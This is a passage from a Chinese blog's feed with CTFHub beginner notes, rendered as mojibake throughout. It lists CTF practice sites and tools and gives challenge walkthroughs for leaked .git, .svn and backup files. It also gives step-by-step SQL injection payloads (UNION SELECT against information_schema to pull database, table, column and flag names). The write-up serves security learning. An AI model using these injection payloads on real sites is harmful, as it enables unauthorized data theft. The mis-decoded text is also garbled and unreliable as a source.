‡æ•°æ®åŒ…çš„æ•°æ®é•¿åº¦ä¸º4ä¸ªå­—èŠ‚ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä»£è¡¨æŒ‰é”®ï¼Œå½“å–0x00æ—¶ï¼Œä»£è¡¨æ²¡æœ‰æŒ‰é”®;ä¸º0x01æ—¶ï¼Œä»£è¡¨æŒ‰å·¦é”®ï¼Œä¸º0x02æ—¶ï¼Œä»£è¡¨å½“å‰æŒ‰é”®ä¸ºå³é”®ã€‚</p><p>ç¬¬äºŒä¸ªå­—èŠ‚ä»£è¡¨å·¦å³åç§»;å½“å€¼ä¸ºæ­£æ—¶ï¼Œä»£è¡¨å³ç§»å¤šå°‘åƒç´ ã€‚å½“å€¼ä¸ºè´Ÿæ—¶ï¼Œä»£è¡¨å·¦ç§»å¤šå°‘åƒç´ ã€‚<br>åŒç†ï¼Œç¬¬ä¸‰ä¸ªå­—èŠ‚ä»£è¡¨ä¸Šä¸‹åç§»ã€‚</p></blockquote><p>ç”¨è„šæœ¬å»ç”»å‡ºé¼ æ ‡çš„å›¾</p></li></ol></li><li><p>HTTPSæµé‡åŒ…æ–‡ä»¶åˆ†æ</p><blockquote><p>Preferences-&gt;Protocols-&gt;SSL-&gt;Edit RSA keys list</p></blockquote></li></ol><h1><span id="crypto">Crypto</span></h1><p><a href="http://www.hiencode.com/">è§£ç å·¥å…·ç½‘ç«™</a></p><ul><li><p>ç¼–ç ï¼š</p><ul><li>ASCII</li><li>BASE64ï¼š<ul><li>ç‰¹å¾ï¼šæ–‡æœ¬æœ«å°¾å‡ºç°1åˆ°2ä¸ª**&#x3D;&#x3D;**</li></ul></li><li>URLï¼š<ul><li>å°±æ˜¯ä¸€ä¸ªå­—ç¬¦çš„asciiç çš„åå…­è¿›åˆ¶ï¼Œéœ€è¦åœ¨å‰é¢åŠ %ã€‚</li><li>ç‰¹å¾ï¼š%</li></ul></li><li>Unicode<ul><li>ç‰¹å¾ï¼š\uxx</li></ul></li><li>js<ul><li>ä½¿ç”¨æµè§ˆå™¨è¾“å…¥eval()</li></ul></li></ul></li><li><p>åŠ å¯†</p><ul><li>å¯¹ç§°åŠ å¯†<ul><li>DES</li><li>AES</li></ul></li><li>éå¯¹ç§°åŠ å¯†<ul><li>RSA</li><li>ECA</li></ul></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/categories/ctf/"/>
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CTFHubå…¥é—¨ç¬”è®°</title>
    <link href="https://disda-coding.github.io/2023/03/29/ctf/"/>
    <id>https://disda-coding.github.io/2023/03/29/ctf/</id>
    <published>2023-03-29T02:26:56.000Z</published>
    <updated>2023-04-20T08:34:56.082Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æ”¶é›†å’Œè®°å½•ä¸€ä¸‹CTFå…¥é—¨çš„write up</p><span id="more"></span><!-- toc --><ul><li><a href="#%E7%BD%91%E7%AB%99">ç½‘ç«™</a></li><li><a href="#%E5%B7%A5%E5%85%B7">å·¥å…·</a></li><li><a href="#web">Web</a><ul><li><a href="#%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD">å‰ç½®æŠ€èƒ½</a><ul><li><a href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F">è¯·æ±‚æ–¹å¼</a></li><li><a href="#302%E8%B7%B3%E8%BD%AC">302è·³è½¬</a></li><li><a href="#cookie">Cookie</a></li><li><a href="#%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81">åŸºç¡€è®¤è¯</a></li><li><a href="#%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81">å“åº”åŒ…æºä»£ç </a></li></ul></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">ä¿¡æ¯æ³„éœ²</a><ul><li><a href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86">ç›®å½•éå†</a></li><li><a href="#phpinfo">phpinfo</a></li><li><a href="#hg%E6%B3%84%E9%9C%B2">hgæ³„éœ²</a></li><li><a href="#svn%E6%B3%84%E9%9C%B2">SVNæ³„éœ²</a></li><li><a href="#git%E6%B3%84%E9%9C%B2">Gitæ³„éœ²</a><ul><li><a href="#log">log</a></li><li><a href="#stash">Stash</a></li><li><a href="#index">index</a></li></ul></li><li><a href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD">å¤‡ä»½æ–‡ä»¶ä¸‹è½½</a><ul><li><a href="#%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81">ç½‘ç«™æºç </a></li><li><a href="#bak%E6%96%87%E4%BB%B6">bakæ–‡ä»¶</a></li><li><a href="#vim%E7%BC%93%E5%AD%98">vimç¼“å­˜</a></li><li><a href="#ds_store">DS_Store</a></li></ul></li><li><a href="#%E5%AD%97%E7%AC%A6%E5%9E%8B">å­—ç¬¦å‹</a></li><li><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">æŠ¥é”™æ³¨å…¥</a></li><li><a href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5">å¸ƒå°”æ³¨å…¥</a></li><li><a href="#mysql%E7%BB%93%E6%9E%84">MySQLç»“æ„</a></li><li><a href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">æ—¶é—´ç›²æ³¨</a></li><li><a href="#cookie%E6%B3%A8%E5%85%A5">cookieæ³¨å…¥</a></li><li><a href="#ua%E6%B3%A8%E5%85%A5">UAæ³¨å…¥</a></li><li><a href="#referer%E6%B3%A8%E5%85%A5">Refereræ³¨å…¥</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC">è¿‡æ»¤ç©ºæ ¼</a></li></ul></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">æ–‡ä»¶ä¸Šä¼ </a><ul><li><a href="#%E6%97%A0%E9%AA%8C%E8%AF%81">æ— éªŒè¯</a></li><li><a href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81">å‰ç«¯éªŒè¯</a></li><li><a href="#htaccess">.htaccess</a></li><li><a href="#mime">MIME</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5">æ–‡ä»¶å¤´æ£€æŸ¥</a></li><li><a href="#00%E6%88%AA%E6%96%AD">00æˆªæ–­</a></li><li><a href="#%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80">åŒå†™åç¼€</a></li></ul></li><li><a href="#rce">RCE</a><ul><li><a href="#eval%E6%89%A7%E8%A1%8C">evalæ‰§è¡Œ</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">æ–‡ä»¶åŒ…å«</a></li><li><a href="#phpinput">php:&#x2F;&#x2F;input</a></li><li><a href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81">è¯»å–æºä»£ç </a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB">è¿œç¨‹åŒ…å«</a></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5">å‘½ä»¤æ³¨å…¥</a></li><li><a href="#%E8%BF%87%E6%BB%A4cat">è¿‡æ»¤cat</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC-1">è¿‡æ»¤ç©ºæ ¼</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E5%89%B2%E7%AC%A6">è¿‡æ»¤ç›®å½•åˆ†å‰²ç¬¦</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6">è¿‡æ»¤è¿ç®—ç¬¦</a></li><li><a href="#%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0">ç»¼åˆç»ƒä¹ </a></li></ul></li><li><a href="#ssrf">SSRF</a><ul><li><a href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE">å†…ç½‘è®¿é—®</a></li><li><a href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6">ä¼ªåè®®è¯»å–æ–‡ä»¶</a></li><li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">ç«¯å£æ‰«æ</a></li><li><a href="#post%E8%AF%B7%E6%B1%82">POSTè¯·æ±‚</a></li><li><a href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6">ä¸Šä¼ æ–‡ä»¶</a></li><li><a href="#redis%E5%8D%8F%E8%AE%AE">Redisåè®®</a></li><li><a href="#url-bypass">URL Bypass</a></li><li><a href="#%E6%95%B0%E5%AD%97ip-bypass">æ•°å­—IP Bypass</a></li><li><a href="#302%E8%B7%B3%E8%BD%AC-1">302è·³è½¬</a></li><li><a href="#dns%E9%87%8D%E7%BB%91%E5%AE%9A-bypass">DNSé‡ç»‘å®š Bypass</a></li></ul></li></ul></li><li><a href="#reverse">Reverse</a></li><li><a href="#crypto">Crypto</a></li><li><a href="#misc">Misc</a><ul><li><a href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">æµé‡åˆ†æ</a><ul><li><a href="#mysql%E6%B5%81%E9%87%8F">Mysqlæµé‡</a></li><li><a href="#redis%E6%B5%81%E9%87%8F">Redisæµé‡</a></li><li><a href="#mongodb">MongoDB</a></li><li><a href="#icmp-data">ICMP Data</a></li><li><a href="#icmp-length">ICMP Length</a></li><li><a href="#icmp-lengthbin">ICMP LengthBin</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="ç½‘ç«™">ç½‘ç«™</span></h1><ul><li>åˆ·é¢˜<ul><li><a href="https://www.ctfhub.com/#/skilltree">CTFHUB</a> å¯¹æ–°äººæå…¶å‹å¥½ï¼Œå¯ä»¥å¿«é€Ÿå…¥é—¨CTF</li><li><a href="https://buuoj.cn/login?next=/challenges?">https://buuoj.cn/login?next=%2Fchallenges%3F</a></li><li><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></li></ul></li><li>æœç´¢å¼•æ“<ul><li><a href="https://fofa.info/">https://fofa.info/</a></li><li><a href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a></li></ul></li></ul><h1><span id="å·¥å…·">å·¥å…·</span></h1><ul><li><p>BurpSuite</p><blockquote><p>â€‹Burp Suiteæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„é›†æˆæ¸—é€æµ‹è¯•å·¥å…·ï¼Œæ—¨åœ¨å¸®åŠ©å®‰å…¨æµ‹è¯•äººå‘˜æ‰§è¡Œå„ç§ Web åº”ç”¨ç¨‹åºå®‰å…¨æµ‹è¯•ã€‚å®ƒæä¾›äº†å¤šä¸ªæ¨¡å—ï¼ŒåŒ…æ‹¬ä»£ç†ã€æ‰«æå™¨ã€çˆ¬è™«ã€åå°„å™¨ã€æ‹¦æˆªå™¨ã€é‡æ”¾å™¨ç­‰åŠŸèƒ½ï¼Œå¯ååŠ©æµ‹è¯•äººå‘˜å‘ç°åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´ï¼Œå¦‚SQLæ³¨å…¥ã€è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰ã€èº«ä»½éªŒè¯å’Œä¼šè¯é—®é¢˜ã€CSRFã€æ–‡ä»¶åŒ…å«æ¼æ´ç­‰ã€‚</p></blockquote></li><li><p>WiresShark</p><blockquote><p>Wiresharkæ˜¯ä¸€æ¬¾ç½‘ç»œåè®®åˆ†æå·¥å…·ï¼Œå¯ä»¥å¸®åŠ©ç”¨æˆ·æ•è·å’Œåˆ†æç½‘ç»œæ•°æ®åŒ…ã€‚å®ƒèƒ½å¤Ÿå®æ—¶æŠ“å–å’Œå±•ç¤ºç½‘ç»œä¸Šæ‰€æœ‰ä¼ è¾“çš„æ•°æ®ï¼Œå¹¶æä¾›å¤šç§è¿‡æ»¤æœºåˆ¶å’Œç»Ÿè®¡å›¾è¡¨ï¼Œèƒ½å¤Ÿæ·±å…¥äº†è§£ç½‘ç»œé€šä¿¡çš„ç»†èŠ‚ï¼Œå‘ç°ç½‘ç»œé€šä¿¡ä¸­å¯èƒ½å­˜åœ¨çš„é—®é¢˜ã€‚</p></blockquote></li><li><p>fscan</p><blockquote><p>fscanæ˜¯ä¸€æ¬¾åŸºäºPythonçš„ç½‘ç»œæ¸—é€æµ‹è¯•å·¥å…·ï¼Œå®ƒå¯ä»¥ç”¨äºç›®æ ‡å‘ç°ã€ç«¯å£æ‰«æã€æ¼æ´æ£€æµ‹ç­‰æ–¹é¢ã€‚fscanèƒ½å¤Ÿå¿«é€Ÿæ‰«æå¤§é‡IPåœ°å€å’Œç«¯å£ï¼Œå¹¶æä¾›äº†å¤šç§æ‰«ææ–¹å¼å’Œè¿‡æ»¤è§„åˆ™ï¼Œä¾‹å¦‚TCPå’ŒUDPç«¯å£æ‰«æã€æœåŠ¡è¯†åˆ«ã€OSæŒ‡çº¹è¯†åˆ«ç­‰ã€‚</p></blockquote></li><li><p>GitHack</p><blockquote><p>GitHackæŒ‡çš„æ˜¯ä¸€ç§åŸºäºGitç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„æ”»å‡»æŠ€æœ¯ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨GitHackæ¥è·å–æ•æ„Ÿä¿¡æ¯æˆ–æ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œã€‚æ”»å‡»è€…é€šå¸¸ä¼šåœ¨Gitä¸ŠæŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚å¯†ç æˆ–ç§é’¥ï¼Œå¹¶åˆ©ç”¨è¿™äº›ä¿¡æ¯è¿›ä¸€æ­¥å…¥ä¾µç›®æ ‡ç³»ç»Ÿã€‚</p></blockquote></li><li><p>dvcs-ripper</p><blockquote><p>å¯ä»¥æ”¯æŒsvnã€hgç­‰æ–‡ä»¶ä¸‹è½½</p></blockquote></li><li><p>PostMan</p><blockquote><p>Postmanæ˜¯ä¸€ä¸ª<a href="https://baike.baidu.com/item/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/1917757?fromModule=lemma_inlink">æ¥å£æµ‹è¯•</a>å·¥å…·,åœ¨åšæ¥å£æµ‹è¯•çš„æ—¶å€™,Postmanç›¸å½“äºä¸€ä¸ªå®¢æˆ·ç«¯,å®ƒå¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·å‘èµ·çš„å„ç±»<a href="https://baike.baidu.com/item/HTTP%E8%AF%B7%E6%B1%82/10882159?fromModule=lemma_inlink">HTTPè¯·æ±‚</a>,å°†è¯·æ±‚<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8F%91%E9%80%81/22124759?fromModule=lemma_inlink">æ•°æ®å‘é€</a>è‡³<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E7%AB%AF/6492316?fromModule=lemma_inlink">æœåŠ¡ç«¯</a>,è·å–å¯¹åº”çš„å“åº”ç»“æœ, ä»è€ŒéªŒè¯å“åº”ä¸­çš„ç»“æœæ•°æ®æ˜¯å¦å’Œé¢„æœŸå€¼ç›¸åŒ¹é…;å¹¶ç¡®ä¿å¼€å‘äººå‘˜èƒ½å¤ŸåŠæ—¶å¤„ç†æ¥å£ä¸­çš„<a href="https://baike.baidu.com/item/bug/3353935?fromModule=lemma_inlink">bug</a>,è¿›è€Œä¿è¯äº§å“ä¸Šçº¿ä¹‹åçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§</p></blockquote></li></ul><h1><span id="web">Web</span></h1><h3><span id="å‰ç½®æŠ€èƒ½">å‰ç½®æŠ€èƒ½</span></h3><h4><span id="è¯·æ±‚æ–¹å¼">è¯·æ±‚æ–¹å¼</span></h4><ul><li>æ€è·¯ï¼šä½¿ç”¨PostManï¼Œä¿®æ”¹è¯·æ±‚æ–¹å¼ä¸ºCTFHUB</li></ul><h4><span id="302è·³è½¬">302è·³è½¬</span></h4><p>ä½¿ç”¨æµè§ˆå™¨è®¿é—®index.phpæ—¶ï¼Œå‘ç°F12ä¸­networkæœ‰302</p><ul><li>æ€è·¯ï¼šä½¿ç”¨curlè®¿é—®index.phpå³å¯ï¼Œå› ä¸ºcurlä¸æ”¯æŒ302è·³è½¬</li></ul><h4><span id="cookie">Cookie</span></h4><p><a href="https://www.wolai.com/ctfhub/6zSDRPLbitJ5j4e7CE9dLp">å‚è€ƒ</a>ï¼Œä½¿ç”¨<code>burpsuite</code>çš„<code>repeater</code>åŠŸèƒ½</p><h4><span id="åŸºç¡€è®¤è¯">åŸºç¡€è®¤è¯</span></h4><p><a href="https://www.wolai.com/ctfhub/3mSzAzbGydVT74nsq1gcVj">å‚è€ƒ</a>ï¼Œä½¿ç”¨<code>burpsuite</code>çš„<code>Intruder</code>åŠŸèƒ½</p><h4><span id="å“åº”åŒ…æºä»£ç ">å“åº”åŒ…æºä»£ç </span></h4><p>ä½¿ç”¨F12ç›´æ¥åœ¨å‰ç«¯æºä»£ç é‡Œé¢æŸ¥çœ‹</p><h3><span id="ä¿¡æ¯æ³„éœ²">ä¿¡æ¯æ³„éœ²</span></h3><h4><span id="ç›®å½•éå†">ç›®å½•éå†</span></h4><p>ç”±äºé…ç½®é”™è¯¯å¯¼è‡´ç½‘ç«™çš„ç›®å½•å¯è¢«éå†ã€‚</p><ul><li>æ€è·¯ï¼šæˆ‘ä»¬éå†ç½‘ç«™å³å¯æ‰¾åˆ°ç»“æœ</li></ul><h4><span id="phpinfo">phpinfo</span></h4><p>phpinfo()æ˜¯phpä¸­æŸ¥çœ‹ç›¸å…³ä¿¡æ¯çš„å‡½æ•°ï¼Œå½“åœ¨é¡µé¢ä¸­æ‰§è¡Œ<code>phpinfo()</code>å‡½æ•°æ—¶ï¼Œphpä¼šå°†è‡ªèº«çš„æ‰€æœ‰ä¿¡æ¯å…¨éƒ¨æ‰“å°å‡ºæ¥ã€‚åœ¨<code>phpinfo</code>ä¸­ä¼šæ³„éœ²å¾ˆå¤šæœåŠ¡ç«¯çš„ä¸€äº›ä¿¡æ¯</p><ul><li>æ€è·¯ï¼šflagæš´éœ²åœ¨phpinfoä¸­</li></ul><h4><span id="hgæ³„éœ²">hgæ³„éœ²</span></h4><ul><li>æ€è·¯ï¼šä½¿ç”¨dirsearchå‘ç°æœ‰.hgæ–‡ä»¶å¤¹ï¼Œä½¿ç”¨dvcs-ripperä¸‹è½½ç›®å½•ï¼Œä½†æ˜¯å·¥å…·æ²¡æœ‰å°†æ‰€æœ‰æ–‡ä»¶ä¸‹ä¸‹æ¥ï¼Œä½¿ç”¨<code>tree</code>å‘½ä»¤æ¥æŸ¥çœ‹ç›®å½•ï¼Œåˆ†æå‘ç°txtæ–‡ä»¶ä¸­æœ‰<code>add flag</code>ï¼Œä½¿ç”¨<code>grep -a -r flag</code>æŸ¥çœ‹flagå­˜åœ¨çš„æ–‡ä»¶åï¼Œé€šè¿‡curlæ¥æŸ¥çœ‹æ–‡ä»¶ã€‚</li></ul><h4><span id="svnæ³„éœ²">SVNæ³„éœ²</span></h4><ul><li>æ€è·¯ï¼šä½¿ç”¨dirsearchå‘ç°æœ‰.svnæ–‡ä»¶å¤¹ï¼Œä½¿ç”¨dvcs-ripperä¸‹è½½ç›®å½•ï¼Œä» wc.db ä¸­æ‰¾åˆ° flag çš„æ–‡ä»¶çš„æ–‡ä»¶å, å°è¯•è®¿é—®ç»“æœå‘ç°è¢«åˆ é™¤äº†ã€‚æŸ¥çœ‹<code>.svn/pristine/</code>ä¸­çš„æ–‡ä»¶ï¼Œæ‰¾åˆ°flag</li></ul><h4><span id="gitæ³„éœ²">Gitæ³„éœ²</span></h4><ul><li>æ€è·¯ï¼šä½¿ç”¨dirsearchå‘ç°æœ‰.gitæ–‡ä»¶å¤¹ï¼Œä½¿ç”¨githackå·¥å…·å°†ç½‘ç«™é‡Œçš„.gitæ–‡ä»¶å¤¹ä¸‹è½½åˆ°æœ¬åœ°</li></ul><h5><span id="log">log</span></h5><p>ç½‘ç«™ä¸‹å¯èƒ½æœ‰.gitæ–‡ä»¶</p><ul><li>æ€è·¯ï¼šæˆ‘ä»¬é€šè¿‡<code>git log</code>æŸ¥çœ‹æäº¤æ—¥å¿—ï¼Œç„¶åç”¨è¿‡<code>git diff</code>æ¥å¯¹æ¯”ç‰ˆæœ¬åŒºåˆ«æ‰¾åˆ°flag</li></ul><h5><span id="stash">Stash</span></h5><p>gitå¯èƒ½æœ‰çš„æ–‡ä»¶æ”¾åˆ°stashæš‚å­˜</p><ul><li>æ€è·¯ï¼šé€šè¿‡<code>git stash list</code>æŸ¥çœ‹ï¼Œæ‰§è¡Œ git stash pop å‘ç°ä» git æ ˆä¸­å¼¹å‡ºæ¥ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å°±æ˜¯ flag</li></ul><h5><span id="index">index</span></h5><p>ä½¿ç”¨<code>git ls-file --stage</code>æŸ¥çœ‹index fileæ–‡ä»¶ï¼Œä½¿ç”¨<code>git log</code>å‘½ä»¤æŸ¥çœ‹å†å²è®°å½•ï¼Œé€šè¿‡<code>git diff</code>å¯¹æ¯”æäº¤ç‰ˆæœ¬ã€‚</p><h4><span id="å¤‡ä»½æ–‡ä»¶ä¸‹è½½">å¤‡ä»½æ–‡ä»¶ä¸‹è½½</span></h4><h5><span id="ç½‘ç«™æºç ">ç½‘ç«™æºç </span></h5><ul><li>æ€è·¯ï¼šç½‘ç«™æºç å¯èƒ½æ”¾åœ¨ç›®å½•é‡Œé¢ï¼Œæ‰“å¼€å³å¯è·å–flag</li></ul><h5><span id="bakæ–‡ä»¶">bakæ–‡ä»¶</span></h5><p>æœ‰äº›æ—¶å€™ç½‘ç«™ç®¡ç†å‘˜å¯èƒ½ä¸ºäº†æ–¹ä¾¿ï¼Œä¼šåœ¨ä¿®æ”¹æŸä¸ªæ–‡ä»¶çš„æ—¶å€™å…ˆå¤åˆ¶ä¸€ä»½ï¼Œå°†å…¶å‘½åä¸ºxxx.bak</p><ul><li>æ€è·¯ï¼šç›´æ¥ä½¿ç”¨curl + url å³å¯è®¿é—®</li></ul><h5><span id="vimç¼“å­˜">vimç¼“å­˜</span></h5><p>åœ¨ä½¿ç”¨vimæ—¶ä¼šåˆ›å»ºä¸´æ—¶ç¼“å­˜æ–‡ä»¶ï¼Œå…³é—­vimæ—¶ç¼“å­˜æ–‡ä»¶åˆ™ä¼šè¢«åˆ é™¤ï¼Œå½“vimå¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹  </p><p>ä»¥index.phpä¸ºä¾‹ï¼šç¬¬ä¸€æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º<code>.index.php.swp</code>ï¼Œå†æ¬¡æ„å¤–é€€å‡ºåä¼šäº§ç”Ÿåä¸º <code>.index.php.swo</code>çš„äº¤æ¢æ–‡ä»¶ï¼Œç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º <code>.index.php.swn</code></p><ul><li>æ€è·¯ï¼šä½¿ç”¨curlè®¿é—®ï¼Œæˆ–è€…ä½¿ç”¨wgetä¸‹è½½åˆ°æœ¬åœ°å†æŸ¥çœ‹</li></ul><h5><span id="ds_store">DS_Store</span></h5><figure class="highlight plaintext"><figcaption><span>æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡```.DS_Store```å¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- æ€è·¯ï¼šä½¿ç”¨curlå‘½ä»¤è®¿é—®```.DS_Store``` æ–‡ä»¶å³å¯</span><br><span class="line"></span><br><span class="line">### å¯†ç å£ä»¤</span><br><span class="line"></span><br><span class="line">#### å¼±å£ä»¤</span><br><span class="line"></span><br><span class="line">- æ€è·¯ï¼šçœ‹åˆ°ç®¡ç†ç³»ç»Ÿé»˜è®¤è´¦å·ä¸ºadminï¼Œå¯†ç å…ˆå°è¯•ç”¨å¼±å£ä»¤å¯†ç æœ¬æ”»å‡»ï¼Œå‘ç°æ— æ•ˆ</span><br><span class="line"></span><br><span class="line">#### é»˜è®¤å£ä»¤</span><br><span class="line"></span><br><span class="line">- æ€è·¯ï¼šé ç¤¾ä¼šå·¥ç¨‹çš„æ£€ç´¢èƒ½åŠ›</span><br><span class="line"></span><br><span class="line">### SQLæ³¨å…¥</span><br><span class="line"></span><br><span class="line">#### æ•´æ•°å‹</span><br><span class="line"></span><br><span class="line">æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ³¨å…¥</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">xx = ? and 1=1 # è¿”å›æ­£ç¡®</span><br><span class="line">xx = ? and 1=2 # è¿”å›é”™è¯¯</span><br></pre></td></tr></table></figure><p>çŒœå­—æ®µæ•°ï¼ˆxä¸ºæ•°å­—ï¼‰ å¾—å‡ºå­—æ®µæ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">order</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure><p>çˆ†æ•°æ®åº“å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,...,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;æ•°æ®åº“å&#x27;</span> </span><br></pre></td></tr></table></figure><p>çˆ†åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,...,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> </span><br></pre></td></tr></table></figure><p>è·å¾—flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx <span class="operator">=</span> ? <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,...,group_concat(flag) <span class="keyword">from</span> flag.flag</span><br></pre></td></tr></table></figure><p>å…¶ä¸­â€¦ çš„æ•°é‡ä¸º<code>order by x</code>ä¸­çš„x</p><h4><span id="å­—ç¬¦å‹">å­—ç¬¦å‹</span></h4><p>å­—ç¬¦å‹æ³¨å…¥è¦è€ƒè™‘åˆ°  å¼•å·é—­åˆ  å’Œ  æ³¨é‡Š </p><p>åˆ¤æ–­æ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 # è¿”å›æ­£ç¡®</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> # è¿”å›é”™è¯¯</span><br></pre></td></tr></table></figure><p>çŒœå­—æ®µ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span 